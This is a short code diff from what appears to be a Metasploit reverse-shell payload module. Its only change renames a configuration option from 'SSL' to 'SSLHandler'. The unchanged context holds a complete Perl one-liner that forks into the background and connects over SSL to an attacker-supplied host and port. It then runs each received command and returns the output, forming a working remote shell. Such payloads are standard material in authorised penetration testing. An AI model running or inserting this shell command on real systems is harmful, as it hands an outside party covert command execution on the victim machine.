@@ -55,7 +55,7 @@ module Metasploit3
 		lhost = datastore['LHOST']
 		ver   = Rex::Socket.is_ipv6?(lhost) ? "6" : ""
 		lhost = "[#{lhost}]" if Rex::Socket.is_ipv6?(lhost)
-		if datastore['SSL']
+		if datastore['SSLHandler']
 			# Need a succinct way to determine when $c is closed from the framework side, this method is presently unsafe as it leaves the process hanging
 			cmd = "perl -e 'use IO::Socket::SSL;$p=fork;exit,if($p);$c=IO::Socket::SSL->new(\"#{lhost}:#{datastore['LPORT']}\");while($c){sysread($c,$i,8192);syswrite($c,`$i`);}'"
 		else
